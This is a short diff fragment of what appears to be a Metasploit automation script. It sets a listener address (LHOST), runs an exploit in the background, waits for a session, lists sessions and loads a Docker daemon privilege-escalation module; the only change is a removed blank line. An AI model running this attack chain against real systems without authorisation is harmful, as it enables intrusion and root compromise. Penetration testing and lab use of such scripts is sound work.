@@ -6,7 +6,6 @@ set LHOST 192.168.100.87
 exploit -z
 
 sleep 10 # Czekamy aż sesja się otworzy
-
 sessions -l
 
 use linux/local/docker_daemon_privilege_escalation
